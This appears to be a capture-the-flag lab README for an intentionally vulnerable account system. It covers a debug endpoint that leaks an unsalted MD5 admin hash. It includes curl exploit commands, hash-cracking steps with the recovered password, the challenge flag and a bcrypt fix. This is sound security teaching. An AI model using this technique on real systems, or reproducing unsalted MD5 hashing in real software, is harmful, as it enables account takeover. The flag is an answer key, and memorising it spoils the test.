# A02: Cryptographic Failures

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A legacy account system. `GET /api/users/{username}/hash` is an old debug
endpoint that was never removed.

**Play it in the browser** — open http://localhost:9002, click "Get hash" to leak
`admin`'s MD5, crack it externally (CrackStation/hashcat/john), then paste the
result into the login form.

## The bug

Passwords are hashed with unsalted MD5 — fast to compute (bad for password
hashing) and looked up in seconds via any public rainbow table or `hashcat`.
The debug endpoint hands the hash to anyone who asks, no auth required.

## Exploit

```bash
curl -s http://localhost:9002/api/users/admin/hash
# {"username":"admin","password_md5":"0d107d09f5bbe40cade3de5c71e9e9b7"}
```

That hash is a well-known one — crack it with `hashcat -m 0`, `john`, or any
online MD5 lookup. It resolves to `letmein`.

```bash
curl -s -X POST http://localhost:9002/login \
  -d '{"username":"admin","password":"letmein"}'
```

## Flag

`CTF{a02_md5_1s_n0t_h4sh1ng}`

## The fix (for reference)

Hash passwords with a slow, salted algorithm (bcrypt/argon2/scrypt) and never
expose hashes through any endpoint. The platform API
(`platform/internal/auth/password.go`) uses bcrypt at cost 12 for exactly
this reason.
